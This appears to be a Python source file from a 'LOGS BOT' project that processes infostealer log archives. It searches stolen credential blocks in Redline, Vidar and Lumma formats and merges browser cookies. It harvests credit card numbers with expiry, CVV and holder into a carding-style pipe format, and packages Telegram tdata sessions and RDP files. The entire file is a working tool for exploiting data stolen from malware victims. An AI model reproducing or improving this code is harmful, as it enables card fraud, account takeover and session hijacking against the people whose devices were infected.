# c:\Users\MARCOS\Desktop\LOGS BOT\extractor.py
import os
import shutil
import zipfile
import subprocess
import re
from pathlib import Path
from typing import List, Set, Optional, Tuple, Dict

try:
    import py7zr
except ImportError:
    py7zr = None

try:
    import rarfile
except ImportError:
    rarfile = None

PASSWORD_FILENAMES = {
    "passwords.txt", "password.txt", "passwords", "credentials.txt",
    "logins.txt", "all passwords.txt", "account.txt", "accounts.txt"
}

# Regex to detect Credit Card pipe/delimiter format: CARD|MM|YY|CVV|HOLDER
CARD_PIPE_REGEX = re.compile(
    r"(?:\b|\A)([2-6]\d{12,18})[|\t:;, /]+(0[1-9]|1[0-2]|\d)[|\t:;, /]+(\d{2,4})(?:[|\t:;, /]+(\d{3,4}))?(?:[|\t:;, /]*([^|\r\n\t]*))?",
    re.MULTILINE
)

# Regex to detect lines already in card pipe format
CARD_LINE_PREFIX_REGEX = re.compile(
    r"^\s*([2-6]\d{12,18})\|(\d{1,2})\|(\d{2,4})(?:\|([^|\r\n]*))?(?:\|([^|\r\n]*))?",
    re.MULTILINE
)

def find_system_7z() -> Optional[str]:
    """Finds system 7z binary if available."""
    for binary in ["7z", "7za", "7zr", "C:\\Program Files\\7-Zip\\7z.exe"]:
        found = shutil.which(binary)
        if found:
            return found
        if os.path.isfile(binary):
            return binary
    return None

def unpack_archive(archive_path: Path, dest_dir: Path, password: Optional[str] = None) -> bool:
    """
    Unpacks ZIP, RAR, or 7Z archives completely into dest_dir.
    Prioritizes native 7z CLI for maximum speed and RAR5 compatibility.
    Falls back to Python libraries.
    """
    dest_dir.mkdir(parents=True, exist_ok=True)
    suffix = archive_path.suffix.lower()
    seven_z = find_system_7z()

    # Strategy 1: System 7z CLI
    if seven_z:
        cmd = [seven_z, "x", str(archive_path), f"-o{dest_dir}", "-y"]
        if password:
            cmd.append(f"-p{password}")
        else:
            cmd.append("-p-")
        try:
            res = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=900)
            if res.returncode == 0 and any(dest_dir.iterdir()):
                return True
        except Exception as e:
            print(f"[!] 7z CLI execution failed: {e}")

    # Strategy 2: Python Libraries Fallback
    pwd_bytes = password.encode() if password else None
    try:
        if suffix == ".zip":
            with zipfile.ZipFile(archive_path, "r") as z:
                for member in z.infolist():
                    target_path = dest_dir / member.filename
                    if not target_path.resolve().is_relative_to(dest_dir.resolve()):
                        continue
                    z.extract(member, path=dest_dir, pwd=pwd_bytes)
            return True

        elif suffix == ".rar" and rarfile:
            with rarfile.RarFile(archive_path, "r") as r:
                if password:
                    r.setpassword(password)
                r.extractall(path=dest_dir)
            return True

        elif suffix == ".7z" and py7zr:
            with py7zr.SevenZipFile(archive_path, mode="r", password=password) as z:
                z.extractall(path=dest_dir)
            return True

    except Exception as err:
        print(f"[!] Python extraction failed: {err}")

    return False

def is_cookie_path(root_lower: str, file_lower: str) -> bool:
    """Checks if a file is a cookie file by parent directory or filename."""
    if "cookie" in root_lower or "cookie" in file_lower:
        return file_lower.endswith(".txt") or file_lower.endswith(".json") or file_lower.endswith(".sqlite") or file_lower.endswith(".log")
    return False

def is_card_path(root_lower: str, file_lower: str) -> bool:
    """Checks if a file is an autofill or card file by directory or filename."""
    keywords = ["card", "credit", "autofill", "cc", "wallet", "payment", "web data"]
    return any(k in root_lower or k in file_lower for k in keywords)

def scan_session_stats(session_path: Path) -> dict:
    """Analyzes unpacked logs to count total files, logs, cookies, passwords, and sessions."""
    stats = {
        "total_files": 0,
        "password_files": 0,
        "cookie_files": 0,
        "card_files": 0,
        "tdata_folders": 0,
        "rdp_files": 0,
        "size_mb": 0.0
    }
    total_bytes = 0

    for root, dirs, files in os.walk(session_path):
        root_l = root.lower()
        for d in dirs:
            if d.lower() == "tdata":
                stats["tdata_folders"] += 1

        for f in files:
            stats["total_files"] += 1
            fl = f.lower()
            fp = Path(root) / f
            try:
                total_bytes += fp.stat().st_size
            except OSError:
                pass

            if fl.endswith(".rdp"):
                stats["rdp_files"] += 1
            if any(p in fl for p in PASSWORD_FILENAMES) or ("password" in root_l and fl.endswith(".txt")):
                stats["password_files"] += 1
            if is_cookie_path(root_l, fl):
                stats["cookie_files"] += 1
            if is_card_path(root_l, fl):
                stats["card_files"] += 1

    stats["size_mb"] = round(total_bytes / (1024 * 1024), 2)
    return stats

def read_file_safe(file_path: Path) -> Optional[str]:
    """Reads file with UTF-8, UTF-16, or Latin-1 fallback."""
    try:
        with open(file_path, "rb") as bf:
            raw = bf.read(65536 * 16)
            if b"\x00" in raw[:100]:
                try:
                    return raw.decode("utf-16-le", errors="ignore")
                except Exception:
                    pass
            try:
                return raw.decode("utf-8", errors="ignore")
            except Exception:
                return raw.decode("latin-1", errors="ignore")
    except Exception:
        return None

def search_keywords_in_logs(session_path: Path, keyword: str, max_results: int = 50000) -> Tuple[List[str], int]:
    """
    Intelligent Stealer Log Parser:
    Extracts complete credential blocks (URL, Username, Password) or combo lines
    matching the specified keyword or domain.
    """
    keyword_lower = keyword.strip().lower()
    results = []
    seen = set()
    total_found = 0

    for root, _, files in os.walk(session_path):
        root_l = root.lower()
        for file in files:
            fl = file.lower()
            if fl.endswith(".txt") or any(pf in fl for pf in PASSWORD_FILENAMES) or "password" in root_l:
                file_path = Path(root) / file
                content = read_file_safe(file_path)
                if not content or keyword_lower not in content.lower():
                    continue

                lines = content.splitlines()
                i = 0
                while i < len(lines):
                    line = lines[i]
                    if keyword_lower in line.lower():
                        # Multi-line block format (Redline / Vidar / Lumma)
                        block = []
                        start_idx = max(0, i - 1)
                        end_idx = min(len(lines), i + 6)
                        
                        has_credentials = False
                        for j in range(start_idx, end_idx):
                            l = lines[j].strip()
                            if any(k in l.lower() for k in ["url:", "host:", "soft:", "username:", "user:", "login:", "password:", "pass:"]):
                                has_credentials = True
                                block.append(l)
                            elif block and l.startswith("="):
                                break

                        if has_credentials and len(block) >= 2:
                            entry_text = "\n".join(block)
                            if entry_text not in seen:
                                seen.add(entry_text)
                                total_found += 1
                                if len(results) < max_results:
                                    results.append(entry_text + "\n" + "-" * 40)
                            i = end_idx
                            continue
                        else:
                            # Standard combo line (URL:USER:PASS or USER:PASS)
                            clean_line = line.strip()
                            if clean_line and clean_line not in seen:
                                seen.add(clean_line)
                                total_found += 1
                                if len(results) < max_results:
                                    results.append(clean_line)

                    i += 1

    return results, total_found

def collect_cookies(session_path: Path, output_file: Path) -> Tuple[int, int]:
    """
    Collects all cookie files across the entire session:
    Detects cookies by directory name (Cookies/) as well as filenames.
    Merges all text cookies into output_file.
    Returns (number_of_cookie_files, total_cookie_lines).
    """
    output_file.parent.mkdir(parents=True, exist_ok=True)
    file_count = 0
    total_lines = 0

    with open(output_file, "w", encoding="utf-8", errors="ignore") as outfile:
        for root, _, files in os.walk(session_path):
            root_l = root.lower()
            for file in files:
                fl = file.lower()
                if is_cookie_path(root_l, fl):
                    file_path = Path(root) / file
                    try:
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as inf:
                            lines = inf.readlines()
                            if lines:
                                file_count += 1
                                total_lines += len(lines)
                                outfile.write(f"\n# --- Cookie Source: {file_path.name} ({len(lines)} lines) ---\n")
                                outfile.writelines(lines)
                    except Exception:
                        pass

    return file_count, total_lines

def collect_cards(session_path: Path, output_file: Path) -> Tuple[int, int]:
    """
    High-Speed Deep Credit Card Harvester:
    Scans every text, autofill, card, and log file across the archive.
    Extracts all credit card records matching:
    - Standard pipe format: NUMBER|MM|YY|CVV|HOLDER
    - Autofill records & CC blocks
    Deduplicates and outputs clean lines.
    Returns (total_unique_cards, files_with_cards).
    """
    output_file.parent.mkdir(parents=True, exist_ok=True)
    unique_cards: Set[str] = set()
    files_with_cards = 0

    for root, _, files in os.walk(session_path):
        root_l = root.lower()
        for file in files:
            fl = file.lower()
            if fl.endswith(".txt") or fl.endswith(".log") or is_card_path(root_l, fl):
                file_path = Path(root) / file
                content = read_file_safe(file_path)
                if not content:
                    continue

                initial_len = len(unique_cards)

                # Strategy 1: Match existing pipe-delimited card lines
                for m in CARD_LINE_PREFIX_REGEX.finditer(content):
                    card_num, mm, yy, cvv, name = m.group(1), m.group(2), m.group(3), m.group(4) or "", m.group(5) or ""
                    clean_line = f"{card_num}|{mm.zfill(2)}|{yy[-2:]}|{cvv.strip()}|{name.strip()}"
                    unique_cards.add(clean_line)

                # Strategy 2: Match general delimiter patterns in text
                for m in CARD_PIPE_REGEX.finditer(content):
                    card_num, mm, yy, cvv, name = m.group(1), m.group(2), m.group(3), m.group(4) or "", m.group(5) or ""
                    # Validate month
                    try:
                        month_int = int(mm)
                        if 1 <= month_int <= 12:
                            clean_line = f"{card_num}|{str(month_int).zfill(2)}|{yy[-2:]}|{cvv.strip()}|{name.strip()}"
                            unique_cards.add(clean_line)
                    except ValueError:
                        continue

                # Strategy 3: Parse multiline labeled cards (Card Number: ... Exp: ... Cvv: ...)
                if "card" in content.lower() or "credit" in content.lower():
                    lines = content.splitlines()
                    for idx, line in enumerate(lines):
                        if any(c_kw in line.lower() for c_kw in ["card number", "number:", "card:"]):
                            num_match = re.search(r"([2-6]\d{12,18})", line)
                            if num_match:
                                c_num = num_match.group(1)
                                c_mm, c_yy, c_cvv, c_name = "01", "30", "", ""
                                # search subsequent 5 lines for exp, cvv, holder
                                for sub_idx in range(idx + 1, min(len(lines), idx + 6)):
                                    sub_line = lines[sub_idx]
                                    exp_match = re.search(r"(\d{1,2})[/-](\d{2,4})", sub_line)
                                    if exp_match:
                                        c_mm = exp_match.group(1).zfill(2)
                                        c_yy = exp_match.group(2)[-2:]
                                    cvv_match = re.search(r"(?:cvv|cvc|code)[:\s]*(\d{3,4})", sub_line, re.IGNORECASE)
                                    if cvv_match:
                                        c_cvv = cvv_match.group(1)
                                    holder_match = re.search(r"(?:holder|name)[:\s]*([A-Za-z ]+)", sub_line, re.IGNORECASE)
                                    if holder_match:
                                        c_name = holder_match.group(1).strip()
                                
                                clean_line = f"{c_num}|{c_mm}|{c_yy}|{c_cvv}|{c_name}"
                                unique_cards.add(clean_line)

                if len(unique_cards) > initial_len:
                    files_with_cards += 1

    # Write all deduplicated cards to output file
    with open(output_file, "w", encoding="utf-8") as outfile:
        outfile.write(f"# Extracted Cards & Autofill Records | Total Found: {len(unique_cards)}\n")
        outfile.write("# Format: NUMBER|EXP_MONTH|EXP_YEAR|CVV|HOLDER\n")
        outfile.write("#" + "=" * 60 + "\n\n")
        for card in sorted(unique_cards):
            outfile.write(card + "\n")

    return len(unique_cards), files_with_cards

def collect_all_passwords(session_path: Path, output_file: Path) -> int:
    """Collects all passwords/credentials files into one aggregated file."""
    output_file.parent.mkdir(parents=True, exist_ok=True)
    count = 0
    with open(output_file, "w", encoding="utf-8", errors="ignore") as outfile:
        for root, _, files in os.walk(session_path):
            root_l = root.lower()
            for file in files:
                fl = file.lower()
                if any(p in fl for p in PASSWORD_FILENAMES) or ("password" in root_l and fl.endswith(".txt")):
                    count += 1
                    file_path = Path(root) / file
                    outfile.write(f"\n# --- Log File: {file_path.name} ---\n")
                    try:
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as inf:
                            shutil.copyfileobj(inf, outfile)
                    except Exception:
                        pass
    return count

def package_tdata(session_path: Path, output_zip: Path) -> int:
    """Packages all TData telegram session folders into a single zip archive."""
    output_zip.parent.mkdir(parents=True, exist_ok=True)
    tdata_count = 0
    with zipfile.ZipFile(output_zip, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, _ in os.walk(session_path):
            for d in dirs:
                if d.lower() == "tdata":
                    tdata_count += 1
                    tdata_folder = Path(root) / d
                    for f in tdata_folder.rglob("*"):
                        if f.is_file():
                            arc_path = Path(f"tdata_{tdata_count}") / f.relative_to(tdata_folder)
                            zf.write(f, arcname=str(arc_path))
    return tdata_count

def package_rdp(session_path: Path, output_zip: Path) -> int:
    """Packages all RDP connection files into a zip archive."""
    output_zip.parent.mkdir(parents=True, exist_ok=True)
    rdp_count = 0
    with zipfile.ZipFile(output_zip, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(session_path):
            for file in files:
                if file.lower().endswith(".rdp"):
                    rdp_count += 1
                    fp = Path(root) / file
                    zf.write(fp, arcname=f"rdp_{rdp_count}_{file}")
    return rdp_count
